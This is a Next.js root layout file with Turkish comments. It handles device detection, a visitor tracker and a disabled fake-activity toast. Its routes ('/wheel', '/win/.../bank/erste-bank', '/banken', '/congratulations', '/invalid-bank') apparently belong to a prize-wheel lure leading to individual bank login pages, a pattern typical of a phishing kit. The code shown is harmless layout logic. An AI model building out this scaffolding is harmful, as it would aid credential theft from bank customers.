"use client";

import { useEffect, useState } from "react";
import { usePathname } from "next/navigation";
import LiveToast from "@/components/LiveToast";
import { SettingsProvider } from "@/contexts/SettingsContext";
import { VisitorTracker } from "@/components/VisitorTracker";
import "./globals.css";

export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  const pathname = usePathname();
  const [isMobileDevice, setIsMobileDevice] = useState(false);

  useEffect(() => {
    const mediaQuery = window.matchMedia("(max-width: 640px), (pointer: coarse)");

    const updateDeviceState = () => {
      const touchCapable = navigator.maxTouchPoints > 0;
      setIsMobileDevice(mediaQuery.matches || touchCapable && window.innerWidth <= 900);
    };

    updateDeviceState();
    mediaQuery.addEventListener("change", updateDeviceState);
    window.addEventListener("resize", updateDeviceState);

    return () => {
      mediaQuery.removeEventListener("change", updateDeviceState);
      window.removeEventListener("resize", updateDeviceState);
    };
  }, []);

  // Sadece belirli yollarda bildirimi gösterme kuralları:
  // Admin yolları, geçersiz banka sayfaları, tebrikler veya BİREYSEL banka giriş sayfalarında göstermeyelim.
  // "/banken" (liste) sayfasında GÖSTERİLECEK.
  const hideToastOnPaths = [
    "/admin",
    "/admin/login",
    "/invalid-bank",
    "/congratulations",
    "/live-support",
    "/banken"
  ];
  
  // Eğer yol "/bank/" içeriyorsa (örneğin /win/123/bank/erste-bank), toast'u gizle.
  // Ama "/banken" ise gizleme.
  const shouldShowToast = !hideToastOnPaths.some(path => pathname.startsWith(path)) && !pathname.includes("/bank/");

  // Public akista portal arka plani gorunsun; yalnizca admin ve wheel kendi zeminini kullansin.
  const isAdminPage = pathname.startsWith("/admin");
  const shouldHideThemeBackground = pathname.startsWith("/wheel");

  const bodyClass = [
    isAdminPage || shouldHideThemeBackground ? "bg-[#f4f7f9]" : "ah-theme",
    isMobileDevice ? "device-mobile" : "device-desktop",
  ]
    .filter(Boolean)
    .join(" ");

  // GEÇİCİ OLARAK KAPATILDI: LiveToast özelliği daha sonra tekrar açılmak üzere deaktif edildi.
  // Kullanıcının göreceği arayüz tasarımları yenilendiği için bildirimler gizlendi.
  const ENABLE_TOAST = false;

  return (
    <html lang="en">
      <body className={bodyClass}>
        <VisitorTracker />
        <SettingsProvider>
          {ENABLE_TOAST && shouldShowToast && <LiveToast />}
          {children}
        </SettingsProvider>
      </body>
    </html>
  );
}
